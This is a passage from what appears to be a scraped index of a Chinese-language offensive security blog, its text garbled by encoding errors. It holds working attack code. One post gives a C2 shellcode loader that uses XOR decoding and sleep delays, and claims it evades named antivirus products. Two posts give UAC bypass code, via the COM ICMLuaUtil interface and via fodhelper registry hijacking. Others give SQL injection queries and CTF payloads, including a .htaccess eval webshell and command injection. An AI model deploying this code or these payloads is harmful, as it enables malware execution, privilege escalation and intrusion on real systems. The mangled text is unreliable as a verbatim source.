(LPSOCKADDR)&amp;addrServ, sizeof(SOCKADDR_IN)); if (SOCKET_ERROR == retVal) { cout &lt;&lt; &quot;Bind Failed!&quot; &lt;&lt; endl; closesocket(sServer); //å…³é—­å¥—æ¥å­— WSACleanup(); //é‡Šæ”¾å¥—æ¥å­—èµ„æº; return -1; } //å¼€å§‹ç›‘å¬ retVal = listen(sServer, 1); if (SOCKET_ERROR == retVal) { cout &lt;&lt; &quot;Listen Failed!&quot; &lt;&lt; endl; closesocket(sServer); //å…³é—­å¥—æ¥å­— WSACleanup(); //é‡Šæ”¾å¥—æ¥å­—èµ„æº; return -1; } cout &lt;&lt; &quot;å¼€å§‹ç›‘å¬ä¸­....&quot; &lt;&lt; endl; //æ¥å—å®¢æˆ·ç«¯è¯·æ±‚ sockaddr_in addrClient; int addrClientlen = sizeof(addrClient); sClient = accept(sServer, (sockaddr FAR*) &amp; addrClient, &amp;addrClientlen); // ç”Ÿæˆå¯¹åº”å½“å‰å®¢æˆ·ç«¯è¿æ¥çš„å¥—æ¥å­—sClient if (INVALID_SOCKET == sClient) { cout &lt;&lt; &quot;Accept Failed!&quot; &lt;&lt; endl; closesocket(sServer); //å…³é—­å¥—æ¥å­— WSACleanup(); //é‡Šæ”¾å¥—æ¥å­—èµ„æº; return -1; } int flag = 1; //åªæ¥æ”¶ä¸€æ¬¡ while (flag) { //æ¥æ”¶å®¢æˆ·ç«¯æ•°æ® ZeroMemory(buf, BUF_SIZE); // å¡«å……ä¸º0 é˜²æ­¢å†…å­˜åˆ†é…å‘ç”Ÿæ„å¤– retVal = recv(sClient, buf, BUF_SIZE, 0); // æ¥æ”¶æ•°æ®æ”¾åœ¨bufç¼“å†²åŒº if (SOCKET_ERROR == retVal) //åˆ¤æ–­æ˜¯å¦æ¥æ”¶é”™è¯¯ { cout &lt;&lt; &quot;Recv Failed!&quot; &lt;&lt; endl; closesocket(sServer); //å…³é—­å¥—æ¥å­— closesocket(sClient); //å…³é—­å¥—æ¥å­— WSACleanup(); //é‡Šæ”¾å¥—æ¥å­—èµ„æº; return -1; } if (buf[0] == '0') break; cout &lt;&lt; &quot;æˆåŠŸå»ºç«‹é€šä¿¡&quot; &lt;&lt; endl; send(sClient, sendBuf, sizeof(sendBuf), 0); cout &lt;&lt; &quot;å‘å®¢æˆ·ç«¯å‘é€shellcode...&quot; &lt;&lt; endl; cout &lt;&lt; &quot;å‘é€shellcodeæˆåŠŸ!&quot; &lt;&lt; endl; flag = 0; } //é€€å‡º closesocket(sServer); //å…³é—­å¥—æ¥å­— closesocket(sClient); //å…³é—­å¥—æ¥å­— WSACleanup(); //é‡Šæ”¾å¥—æ¥å­—èµ„æº; return 0;} å®¢æˆ·ç«¯123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108#include &lt;stdio.h&gt;#include &lt;iostream&gt;#include &lt;WinSock2.h&gt;#pragma comment(lib, &quot;ws2_32.lib&quot;) //æ·»åŠ ws2_32åŠ¨æ€åº“#pragma warning(disable:4996) //å¿½ç•¥æ—§å‡½æ•°ä½¿ç”¨çš„è­¦å‘Šusing namespace std;int main(int argc, char* argv[]){ const int BUF_SIZE = 1024; WSADATA wsd; //WSADATAå˜é‡ SOCKET sHost; // æœåŠ¡å™¨å¥—æ¥å­—socket SOCKADDR_IN servAddr; //æœåŠ¡å™¨åœ°å€ char buf[BUF_SIZE]; // å­˜æ”¾å‘é€çš„æ•°æ®ç¼“å†²åŒº char bufRecv[BUF_SIZE]; //æ¥æ”¶æ”¶åˆ°çš„æ•°æ®ç¼“å†²åŒº DWORD dwThreadId; HANDLE hThread; DWORD dwOldProtect; int retVal; // è¿”å›å€¼ if (argc &lt;= 2) { cout &lt;&lt; &quot;USAGE: client.exe &lt;Server IP&gt; &lt;Server PORT&gt;&quot; &lt;&lt; endl; return -1; } if (WSAStartup(MAKEWORD(2, 2), &amp;wsd) != 0) //åˆå§‹åŒ–å¥—ç»“å­—åŠ¨æ€åº“ { cout &lt;&lt; &quot;WSAStartup failed!&quot; &lt;&lt; endl; return -1; } sHost = socket(AF_INET, SOCK_STREAM, 0); //åˆ›å»ºå¥—æ¥å­— IPV4 å¯é çš„ï¼ŒåŒå‘çš„ç±»å‹æœåŠ¡æä¾›å•†é€‰æ‹© if (INVALID_SOCKET == sHost) { cout &lt;&lt; &quot;socket failed!&quot; &lt;&lt; endl; WSACleanup(); return -1; } //è®¾ç½®æœåŠ¡å™¨çš„åœ°å€ servAddr.sin_family = AF_INET; //æŒ‡å®šIPV4 servAddr.sin_addr.s_addr = inet_addr(argv[1]); // æŒ‡å®šæœåŠ¡å™¨çš„åœ°å€ servAddr.sin_port = htons((short)atoi(argv[2])); // æŒ‡å®šæœåŠ¡å™¨çš„ç«¯å£ retVal = connect(sHost, (LPSOCKADDR)&amp;servAddr, sizeof(servAddr)); // å¥—æ¥å­— sockaddrçš„æŒ‡é’ˆï¼Œä¹Ÿå°±æ˜¯åœ°å€ ç¬¬ä¸‰ä¸ªå‚æ•°ä¸ºSOCKADDR_INç»“æ„ä½“çš„å¤§å° if (SOCKET_ERROR == retVal) //åˆ¤æ–­æ˜¯å¦è¿æ¥æˆåŠŸ { cout &lt;&lt; &quot;connect failed!&quot; &lt;&lt; endl; closesocket(sHost); WSACleanup(); return -1; } ZeroMemory(buf, BUF_SIZE); // bufæŒ‡å‘çš„åœ°å€ç”¨0æ¥å¡«å…… strcpy(buf, &quot;ok&quot;); //ç»™okä¸¤ä¸ªå­—èŠ‚çš„å­—ç¬¦ä¸²å¤åˆ¶ç»™bufåŒºæ®µ retVal = send(sHost, buf, strlen(buf), 0); //sendçš„è¿”å›å€¼ if (SOCKET_ERROR == retVal) //åˆ¤æ–­æ˜¯å¦å‘é€æˆåŠŸ { cout &lt;&lt; &quot;send failed!&quot; &lt;&lt; endl; closesocket(sHost); WSACleanup(); return -1; } cout &lt;&lt; &quot;Starting Download Payload&quot; &lt;&lt; endl; ZeroMemory(bufRecv, BUF_SIZE); // bufRevcæŒ‡å‘çš„åœ°å€ç”¨0æ¥å¡«å…… Sleep(2000); //å»¶è¿Ÿä¸¤ç§’èµ·åˆ°å…æ€ç»•è¿‡çš„æ•ˆæœ recv(sHost, bufRecv, BUF_SIZE, 0); //bufRecvç¼“å†²åŒºæ¥æ”¶ æœåŠ¡ç«¯å‘é€æ¥çš„æ•°æ® Sleep(4000); closesocket(sHost); WSACleanup(); for (int i = 0; i &lt; sizeof(bufRecv); i++) { //é‡‡å–å€¾æ—‹çš„æ–¹å¼æ¥è¿›è¡Œå¼‚æˆ–è§£å¯† //Sleep(50); _InterlockedXor8(bufRecv + i, 0x97); } cout &lt;&lt; &quot;åŠ è½½shellcodeä¸­&quot; &lt;&lt; endl; //ä¸‹é¢å°±æ˜¯å¼€è¾Ÿå†…å­˜å­˜å‚¨shellcode åˆ›å»ºçº¿ç¨‹è¿›è¡Œæ‰§è¡Œ char* shellcode = (char*)VirtualAlloc( NULL, BUF_SIZE, MEM_COMMIT, PAGE_READWRITE // åªç”³è¯·å¯è¯»å¯å†™ ); CopyMemory(shellcode, bufRecv, BUF_SIZE); VirtualProtect(shellcode, BUF_SIZE, PAGE_EXECUTE, &amp;dwOldProtect); // VirtualProtectæ”¹å˜å®ƒçš„å±æ€§ -&gt; å¯æ‰§è¡Œ hThread = CreateThread( NULL, // å®‰å…¨æè¿°ç¬¦ NULL, // æ ˆçš„å¤§å° (LPTHREAD_START_ROUTINE)shellcode, // å‡½æ•° NULL, // å‚æ•° NULL, // çº¿ç¨‹æ ‡å¿— &amp;dwThreadId // çº¿ç¨‹ID ); WaitForSingleObject(hThread, INFINITE); return 0;} åœ¨c2ä¸Šè¿è¡ŒæœåŠ¡ç«¯ åœ¨ç›®æ ‡æœºå™¨ä¸Šæ‰§è¡Œå®¢æˆ·ç«¯æ–‡ä»¶,è”ç½‘æƒ…å†µä¸‹ç«ç»’å’Œ360ä¸æŸ¥æ€ æˆåŠŸä¸Šçº¿ å‚è€ƒï¼šhttps://www.cnblogs.com/zpchcbd/p/12170851.html https://payloads.online/archivers/2019-11-10/5","link":"/2020/12/13/%E5%88%A9%E7%94%A8SOCKET%E5%88%86%E7%A6%BBshellcode/"},{"title":"åŸºäºCOMç»„ä»¶æ¥å£çš„BypassUAC","text":"COMæå‡åç§°ï¼ˆCOM Elevation Monikerï¼‰æŠ€æœ¯å…è®¸è¿è¡Œåœ¨ç”¨æˆ·è´¦æˆ·æ§åˆ¶ä¸‹çš„åº”ç”¨ç¨‹åºç”¨æå‡æƒé™çš„æ–¹æ³•æ¥æ¿€æ´»COMç±»ï¼Œä»¥æ­¤æå‡COMæ¥å£æƒé™ã€‚å…¶ä¸­ï¼ŒICMLuaUtilæ¥å£æä¾›äº†ShellExecæ–¹æ³•æ‰§è¡Œå‘½ä»¤ï¼Œåˆ›å»ºæŒ‡å®šè¿›ç¨‹ã€‚ åŸç†æ˜¯åˆ©ç”¨COMæå‡åç§°ä»¥é«˜æƒé™è°ƒç”¨ICMLuaUtilæ¥å£ï¼Œä»è€Œä»¥é«˜æƒé™æ‰§è¡ŒShellExecåˆ›å»ºæŒ‡å®šè¿›ç¨‹ã€‚ä½¿ç”¨æƒé™æå‡COMç±»çš„ç¨‹åºå¿…é¡»é€šè¿‡è°ƒç”¨CoCreateInstanceAsAdminå‡½æ•°åˆ›å»ºCOMç±»ï¼Œå¿…é¡»ç”¨å¯ä¿¡ç¨‹åºè¿è¡Œï¼Œå¦‚æœæ‰§è¡ŒCOMæå‡åç§°ä»£ç çš„ç¨‹åºèº«ä»½ä¸å¯ä¿¡ï¼Œåˆ™ä¼šè§¦å‘UACï¼Œè¦Bypass UACå¿…é¡»è®©è¿™ä¸€æ®µä»£ç åœ¨Windowsçš„å¯ä¿¡ç¨‹åºä¸­è¿è¡Œï¼Œå¦‚è®°äº‹æœ¬ã€è®¡ç®—å™¨ã€rundll32.exeç­‰ï¼Œé€šè¿‡DLLæ³¨å…¥æˆ–æ˜¯åŠ«æŒæŠ€æœ¯ï¼Œå°†è¿™æ®µä»£ç æ³¨å…¥åˆ°è¿™äº›å¯æ¬£ç¨‹åºçš„è¿›ç¨‹ç©ºé—´ä¸­ã€‚é€šè¿‡rundll32.exeè°ƒç”¨è‡ªå®šä¹‰DLLä¸­çš„å¯¼å‡ºå‡½æ•°ï¼Œæ‰§è¡ŒCOMæå‡åç§°çš„ä»£ç ã€‚ æ‰§è¡Œæµç¨‹åˆå§‹åŒ–comåº“-&gt;åˆ›å»ºé«˜æƒé™çš„ICMLuaUtilæ¥å£-&gt;è°ƒç”¨ICMLuaUtilçš„ShellExecæ–¹æ³•-&gt;ä»¥é«˜æƒé™æ‰§è¡Œcmd å®è´¨ä¸Šæ˜¯ä»¥é«˜æƒé™è¿è¡ŒCOMç»„ä»¶ICMLuaUtil,ICMLuaUtilä¸­å¯è°ƒç”¨ShellExecuteæ‰§è¡Œç¨‹åºã€‚å®šä¹‰æˆå¯¼å‡ºå‡½æ•°ï¼Œç”¨å¯ä¿¡ç¨‹åºrundll32è°ƒç”¨å¯¼å‡ºå‡½æ•° ä»£ç 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576#include &quot;pch.h&quot;#include &quot;BypassUAC.h&quot;HRESULT CoCreateInstanceAsAdmin(HWND hWnd, REFCLSID rclsid, REFIID riid, PVOID* ppVoid){ BIND_OPTS3 bo; WCHAR wszCLSID[MAX_PATH] = { 0 }; WCHAR wszMonikerName[MAX_PATH] = { 0 }; HRESULT hr = 0; // åˆå§‹åŒ–COMç¯å¢ƒ ::CoInitialize(NULL); // æ„é€ å­—ç¬¦ä¸² ::StringFromGUID2(rclsid, wszCLSID, (sizeof(wszCLSID) / sizeof(wszCLSID[0]))); hr = ::StringCchPrintfW(wszMonikerName, (sizeof(wszMonikerName) / sizeof(wszMonikerName[0])), L&quot;Elevation:Administrator!new:%s&quot;, wszCLSID); if (FAILED(hr)) { return hr; } // è®¾ç½®BIND_OPTS3 ::RtlZeroMemory(&amp;bo, sizeof(bo)); bo.cbStruct = sizeof(bo); bo.hwnd = hWnd; bo.dwClassContext = CLSCTX_LOCAL_SERVER; // åˆ›å»ºåç§°å¯¹è±¡å¹¶è·å–COMå¯¹è±¡ hr = ::CoGetObject(wszMonikerName, &amp;bo, riid, ppVoid); return hr;}BOOL CMLuaUtilBypassUAC(LPWSTR lpwszExecutable){ HRESULT hr = 0; CLSID clsidICMLuaUtil = { 0 }; IID iidICMLuaUtil = { 0 }; ICMLuaUtil* CMLuaUtil = NULL; BOOL bRet = FALSE; do { ::CLSIDFromString(CLSID_CMSTPLUA, &amp;clsidICMLuaUtil); ::IIDFromString(IID_ICMLuaUtil, &amp;iidICMLuaUtil); // ææƒ hr = CoCreateInstanceAsAdmin(NULL, clsidICMLuaUtil, iidICMLuaUtil, (PVOID*)(&amp;CMLuaUtil)); if (FAILED(hr)) { break; } // å¯åŠ¨ç¨‹åº hr = CMLuaUtil-&gt;lpVtbl-&gt;ShellExec(CMLuaUtil, lpwszExecutable, NULL, NULL, 0, SW_SHOW); if (FAILED(hr)) { break; } bRet = TRUE; } while (FALSE); // é‡Šæ”¾ if (CMLuaUtil) { CMLuaUtil-&gt;lpVtbl-&gt;Release(CMLuaUtil); } return bRet;}//å¯¼å‡ºå‡½æ•°void CALLBACK BypassUAC(HWND hWnd, HINSTANCE hInstance, LPSTR lpszCmdLine, int iCmdShow){ CMLuaUtilBypassUAC((LPWSTR)L&quot;C:\\\\Windows\\\\System32\\\\cmd.exe&quot;);} ç”¨lordpeæŸ¥çœ‹ç”Ÿæˆdllçš„å¯¼å‡ºè¡¨ï¼Œå‘ç°å­˜åœ¨å¯¼å‡ºå‡½æ•° ç”¨rundll32.exeè°ƒç”¨å¯¼å‡ºå‡½æ•° 1rundll32 ComBypassUACdll.dll,BypassUAC BypassUACæˆåŠŸ å‚è€ƒã€ŠWindowsé»‘å®¢ç¼–ç¨‹æŠ€æœ¯è¯¦è§£ã€‹","link":"/2021/03/04/%E5%9F%BA%E4%BA%8ECOM%E7%BB%84%E4%BB%B6%E6%8E%A5%E5%8F%A3%E7%9A%84BypassUAC/"},{"title":"æ— åˆ—åæ³¨å…¥æ€»ç»“","text":"å‰è¨€åœ¨information_schemaè¢«è¿‡æ»¤æ—¶ï¼Œæ— æ³•è·å–åˆ°è¡¨åå’Œåˆ—åï¼Œè¿™æ—¶å€™å°±éœ€è¦é€šè¿‡æ— åˆ—åæ³¨å…¥æ¥è·å–ä¿¡æ¯ã€‚ è·å–è¡¨åæ— åˆ—åæ³¨å…¥ä¹Ÿæ˜¯éœ€è¦è¡¨åçš„ï¼Œå¯ä»¥å…ˆé€šè¿‡InnoDbå’Œsysæ¥è·å–è¡¨å InnoDbè¦æ±‚ï¼šMysqlç‰ˆæœ¬&gt;5.6 inndbä¸­æœ‰innodb_index_statså’Œinnodb_table_statsä¸¤å¼ è¡¨ï¼Œè¿™ä¸¤å¼ è¡¨ä¸­å­˜å‚¨äº†æ•°æ®åº“å’Œå…¶ä¸­çš„æ•°æ®è¡¨çš„ä¿¡æ¯ï¼Œä½†æ˜¯æ²¡æœ‰å­˜å‚¨åˆ—åã€‚ æŸ¥è¯¢è¡¨å 1select group_concat(table_name) from mysql.innodb_table_stats where database_name=database(); sysè¦æ±‚ï¼šMysqlç‰ˆæœ¬&gt;5.7 é€šè¿‡æŸ¥è¯¢sys.schema_table_statistics_with_bufferå’Œsys.schema_auto_increment_columnsè·å¾—è¡¨å sys.schema_auto_increment_columns1select group_concat(table_name)from sys.schema_auto_increment_columns where table_schema=database(); sys.schema_table_statistics_with_buffer1select group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema=database(); æ— åˆ—åæ³¨å…¥æ— åˆ—åæ³¨å…¥çš„åŸç†æ˜¯ä¾é union selectæ—¶äº§ç”Ÿçš„è™šæ‹Ÿè¡¨æ¥æŸ¥è¯¢æ•°æ®ã€‚ æ­£å¸¸çš„è¡¨ union selectäº§ç”Ÿçš„è™šæ‹Ÿè¡¨ï¼Œå¿…é¡»ä¿è¯æŸ¥è¯¢åˆ—æ•°æ˜¯å‡†ç¡®çš„ åªè¦ç»™è™šæ‹Ÿè¡¨å–ä¸€ä¸ªåˆ«åï¼Œå³å¯æŸ¥è¯¢å…¶ä¸­çš„æ•°æ®ï¼Œä¸‹é¢æŸ¥è¯¢äº†ç¬¬äºŒåˆ—çš„æ•°æ® 1select `2` from (select 1,2,3 union select * from users)n; åœ¨åå¼•å·è¢«è¿‡æ»¤æ—¶è¿˜å¯ä»¥ä½¿ç”¨ç»™åˆ—èµ·åˆ«åçš„æ–¹å¼æŸ¥è¯¢ 1select b from (select 1,2 as b,3 union select * from users)n; è¿˜å¯ä»¥ä½¿ç”¨è¡¨å.åˆ—åè¿™ç§å½¢å¼ï¼Œnæ˜¯æˆ‘ä»¬ç»™è™šæ‹Ÿè¡¨èµ·çš„åˆ«å 1select n.2 from (select 1,2,3 union select * from users)n;","link":"/2021/04/05/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/"},{"title":"æ³¨å†Œè¡¨åŠ«æŒBypassUAC","text":"åŸç†ä¸€éƒ¨åˆ†ç³»ç»Ÿç¨‹åºå¯ä»¥ç›´æ¥è·å–ç®¡ç†å‘˜æƒé™è€Œä¸è§¦å‘UACå¼¹çª—ï¼Œè¿™ç±»ç¨‹åºè¢«ç§°ä¸ºç™½åå•ç¨‹åºã€‚å¦‚fodhelper fodhelper.exeåœ¨å¯åŠ¨è¿‡ç¨‹æŸ¥è¯¢æ³¨å†Œè¡¨é¡¹ 1HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command è¯¥é”®å€¼å¯¹å­˜å‚¨å¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„ï¼Œæ™®é€šç”¨æˆ·å¯¹HKCUæœ‰ç¼–è¾‘æƒé™ï¼Œå¯ä»¥å†™å…¥æƒ³è¦æ‰§è¡Œçš„ä»»æ„æ–‡ä»¶ï¼Œå¦‚cmd.exeï¼Œå†™å…¥åçš„æ–‡ä»¶ä¼šä»¥æœ€é«˜æƒé™æ‰§è¡Œ å¦‚æœä¸Šä¸€ä¸ªé”®å€¼å¯¹å­˜åœ¨ï¼Œç»§ç»­æŸ¥è¯¢ 1HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command\\DelegateExecute è‹¥ä¹Ÿå­˜åœ¨ï¼Œåˆ™è¯»å–ç¬¬ä¸€ä¸ªæ³¨å†Œå†…çš„å€¼æ‰§è¡Œ å½“æ‰¾ä¸åˆ°HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\commandçš„æ—¶å€™æ‰ä¼šå»æ‰¾HKCR\\ms-settings\\Classes\\ms-settings\\Shell\\Open\\command é»˜è®¤æƒ…å†µä¸‹è€ŒHKCR\\ms-settings\\Classes\\ms-settings\\Shell\\Open\\commandå­˜åœ¨ï¼Œè€ŒHKCU\\Software\\Classes\\ms-settings\\ä¸å­˜åœ¨ï¼Œå› æ­¤éœ€è¦æ‰‹åŠ¨åˆ›å»ºã€‚ ä»£ç 1.RegCreateKeyAåˆ›å»ºHKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command\\ 2.ä½¿ç”¨RegSetValueExå‘åˆ›å»ºçš„é”®å€¼å¯¹é‡Œå†™å…¥è¦æ‰§è¡Œçš„æ–‡ä»¶å’ŒDelegateExecute 3.CreateProcessAåˆ›å»ºè¿›ç¨‹è¿è¡Œfodhelper.exeï¼Œä»¥é«˜æƒé™è¿è¡Œå‘æ³¨å†Œè¡¨ä¸­å†™å…¥çš„æ–‡ä»¶ 4.åœ¨ä¸€æ®µæ—¶é—´åä½¿ç”¨RegDeleteTreeAåˆ é™¤åˆ›å»ºçš„é”®å€¼å¯¹ï¼Œæ¢å¤åŸçŠ¶ ä»£ç  12345678910111213141516171819202122232425#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main(int argc, char* argv[]) { HKEY hKey; STARTUPINFOA StartupInfo = { 0 }; PROCESS_INFORMATION ProcessInformation = { 0 }; //åˆ›å»ºæ³¨å†Œè¡¨ RegCreateKeyA(HKEY_CURRENT_USER, &quot;Software\\\\Classes\\\\ms-settings\\\\Shell\\\\open\\\\command&quot;, &amp;hKey); //å†™å…¥è¦æ‰§è¡Œçš„æ–‡ä»¶ RegSetValueExA(hKey, &quot;&quot;, 0, REG_SZ, (BYTE*)&quot;cmd.exe&quot;, sizeof(&quot;cmd.exe&quot;)); //å†™å…¥DelegateExecute RegSetValueExA(hKey, &quot;DelegateExecute&quot;, 0, REG_SZ, (BYTE*)&quot;&quot;, sizeof(&quot;&quot;)); //åˆ›å»ºè¿›ç¨‹ï¼Œè¿è¡Œfodhelperä»¥é«˜æƒé™æ‰§è¡Œå†™å…¥çš„æ–‡ä»¶ CreateProcessA(&quot;C:\\\\Windows\\\\System32\\\\cmd.exe&quot;, (LPSTR)&quot;/c C:\\\\Windows\\\\System32\\\\fodhelper.exe&quot;, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, NULL, &amp;StartupInfo, &amp;ProcessInformation); Sleep(3000); //åˆ é™¤åˆ›å»ºçš„ms-settings RegDeleteTreeA(hKey, &quot;Software\\\\Classes\\\\ms-settings&quot;);//åˆ é™¤ return 0;} æ‰§è¡Œå‰ æ‰§è¡Œå ç›¸å…³APIå‡½æ•°RegCreateKeyAåˆ›å»ºé”®å€¼å¯¹ 12345LSTATUS RegCreateKeyA( HKEY hKey, LPCSTR lpSubKey, PHKEY phkResult); RegSetValueExå†™å…¥æ³¨å†Œè¡¨é”®å€¼ æˆåŠŸè¿”å› ERROR_SUCCESS. 12345678LSTATUS RegSetValueExA( HKEY hKey,//æŒ‡å‘ä¸€ä¸ªå·²ç»è¢«æ‰“å¼€æˆ–åˆ›å»ºçš„å­é”®å¥æŸ„ LPCSTR lpValueName,//æŒ‡å®šè¦è¢«æŸ¥è¯¢æˆ–å†™å…¥çš„é”®å€¼çš„åç§° DWORD Reserved,//ä¿ç•™ï¼Œå§‹ç»ˆä¸º0 DWORD dwType,//å†™å…¥é”®å€¼çš„ç±»å‹ const BYTE *lpData,//å†™å…¥é”®å€¼çš„ç¼“å†²åŒº DWORD cbData//å†™å…¥é”®å€¼ç¼“å†²åŒºçš„é•¿åº¦ ); RegDeleteTreeAåˆ é™¤é”®å€¼å¯¹ 1234LSTATUS RegDeleteTreeA( HKEY hKey, LPCSTR lpSubKey); CreateProcessAåˆ›å»ºè¿›ç¨‹ 123456789101112BOOL CreateProcessA( LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);","link":"/2021/02/26/%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%8A%AB%E6%8C%81BypassUAC/"},{"title":"ç¾ŠåŸæ¯2020å¤ç°","text":"easyphpç»™å‡ºæºç ï¼Œå¯ä»¥çœ‹åˆ°åªèƒ½ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ï¼Œå¹¶ä¸”æ–‡ä»¶ååªèƒ½ä¸º.xxxxè¿™ç§å½¢å¼ 123456789101112131415161718192021222324252627282930313233 &lt;?php $files = scandir('./'); foreach($files as $file) { if(is_file($file)){ if ($file !== &quot;index.php&quot;) { unlink($file); } } } if(!isset($_GET['content']) || !isset($_GET['filename'])) { highlight_file(__FILE__); die(); } $content = $_GET['content']; if(stristr($content,'on') || stristr($content,'html') || stristr($content,'type') || stristr($content,'flag') || stristr($content,'upload') || stristr($content,'file')) { echo &quot;Hacker&quot;; die(); } $filename = $_GET['filename']; if(preg_match(&quot;/[^a-z\\.]/&quot;, $filename) == 1) { echo &quot;Hacker&quot;; die(); } $files = scandir('./'); foreach($files as $file) { if(is_file($file)){ if ($file !== &quot;index.php&quot;) { unlink($file); } } } file_put_contents($filename, $content . &quot;\\nHello, world&quot;);?&gt; åˆ©ç”¨.htaccessä¸­çš„auto_prepend_fileï¼Œåœ¨è¿è¡Œphpæ–‡ä»¶å‰ä¼šè‡ªåŠ¨åŒ…å«æŒ‡å®šçš„æ–‡ä»¶ï¼Œè¿™é‡Œè¿‡æ»¤äº†fileï¼Œå¯ä»¥ç”¨\\ç»•è¿‡ï¼ŒæŠŠæ¶æ„ä»£ç æ³¨é‡Šæ‰ï¼Œæœ€ååŠ ä¸Š\\è½¬ä¹‰ï¼Œå› ä¸ºæœ€åæ‹¼æ¥ä¸Šäº†Hello, worldï¼Œéœ€è¦åŠ ä¸Š\\æ¥æ¢è¡Œæ³¨é‡Š 123php_value auto_prepend_fi\\le &quot;.htaccess&quot;#&lt;?php @eval($_GET['cmd']); ?&gt;\\ æœ€ç»ˆç»“æœï¼Œè¿è¡Œä»»ä½•ä¸€ä¸ªphpæ–‡ä»¶çš„æ—¶å€™éƒ½ä¼šè‡ªåŠ¨åŒ…å«.htaccessæ–‡ä»¶ 12php_value auto_prepend_fi\\le &quot;.htaccess&quot;#&lt;?php @eval($_GET['cmd']); ?&gt;\\Hello, world è¯·æ±‚ 1http://adc3ba58-b6c5-466a-acb3-7d3434dafb0c.node3.buuoj.cn/?filename=.htaccess&amp;content=php_value%20auto_prepend_fi\\%0Ale%20%22.htaccess%22%0A%23%3C%3fphp%20%40eval(%24_GET[%27cmd%27])%3b%20%3f%3E\\ æ‰§è¡ŒæˆåŠŸï¼Œæ¥ä¸‹æ¥è¯»å–flagå³å¯ 1http://adc3ba58-b6c5-466a-acb3-7d3434dafb0c.node3.buuoj.cn/index.php?cmd=phpinfo(); BlackcatæŸ¥çœ‹æºç å‘ç°Hei_Mao_Jing_Chang.mp3æ–‡ä»¶ è®¿é—®Hei_Mao_Jing_Chang.mp3å¾—åˆ°æºç  hash_hmacå‡½æ•°ä¼šæŠŠç¬¬äºŒä¸ªå‚æ•°ä½œä¸ºå†…å®¹ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°ä½œä¸ºå¯†é’¥ï¼Œç”¨ç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºç®—æ³•è¿›è¡ŒåŠ å¯†ï¼Œæˆ‘ä»¬åªè¦ç»™$_POST['White-cat-monitor']ä¼ å…¥ä¸€ä¸ªæ•°ç»„ï¼Œhash_hmacå‡½æ•°å°±ä¼šè¿”å›nullï¼Œè¿™æ ·å¯†é’¥å°±å¯æ§äº†ï¼Œæˆ‘æ ¹æ®å¯†é’¥åŠ å¯†è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œç„¶åæŠŠåŠ å¯†åçš„hashä¼ å…¥$_POST['Black-Cat-Sheriff']å³å¯ 1234567891011121314151617if(empty($_POST['Black-Cat-Sheriff']) || empty($_POST['One-ear'])){ die('è°ï¼ç«Ÿæ•¢è¸©æˆ‘ä¸€åªè€³çš„å°¾å·´ï¼');}$clandestine = getenv(&quot;clandestine&quot;);if(isset($_POST['White-cat-monitor'])) $clandestine = hash_hmac('sha256', $_POST['White-cat-monitor'], $clandestine); $hh = hash_hmac('sha256', $_POST['One-ear'], $clandestine); if($hh !== $_POST['Black-Cat-Sheriff']){ die('æœ‰æ„ç„å‡†ï¼Œæ— æ„å‡»å‘ï¼Œä½ çš„æ¢¦æƒ³å°±æ˜¯ä½ è¦ç„å‡†çš„ç›®æ ‡ã€‚ç›¸ä¿¡è‡ªå·±ï¼Œä½ å°±æ˜¯é‚£é¢—å°„ä¸­é¶å¿ƒçš„å­å¼¹ã€‚');}echo exec(&quot;nc&quot;.$_POST['One-ear']); ç”Ÿæˆhashå€¼ 12$hh = hash_hmac('sha256', $_POST['One-ear'], null);var_dump($hh); postæ•°æ®ï¼Œbuuçš„flagåœ¨envé‡Œ 1Black-Cat-Sheriff=afa668e24c118929d895750ef36b2a6382377049b3fe4a00f5a0dcdf2dc8b69a&amp;One-ear=asd;env&amp;White-cat-monitor[]=1 Easyphp2å­˜åœ¨robots.txt è¿™é‡Œå‘ç°base64ã€rot13éƒ½è¢«è¿‡æ»¤ï¼Œç”¨urläºŒæ¬¡ç¼–ç ç»•è¿‡ï¼Œç”¨%6%32ä»£æ›¿bï¼Œ%32è§£ç ä¸º2ï¼Œåˆå¹¶æˆ%62è§£ç ä¸ºb 1http://17a28883-1f23-40fd-a3f6-98a5cf1cd5fc.node3.buuoj.cn/?file=php://filter/read=convert.%6%32ase64-encode/resource=GWHT.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt; &lt;title&gt;count is here&lt;/title&gt; &lt;style&gt; html, body { overflow: none; max-height: 100vh; } &lt;/style&gt;&lt;/head&gt;&lt;body style=&quot;height: 100vh; text-align: center; background-color: green; color: blue; display: flex; flex-direction: column; justify-content: center;&quot;&gt;&lt;center&gt;&lt;img src=&quot;question.jpg&quot; height=&quot;200&quot; width=&quot;200&quot; /&gt; &lt;/center&gt; &lt;?php ini_set('max_execution_time', 5); if ($_COOKIE['pass'] !== getenv('PASS')) { setcookie('pass', 'PASS'); 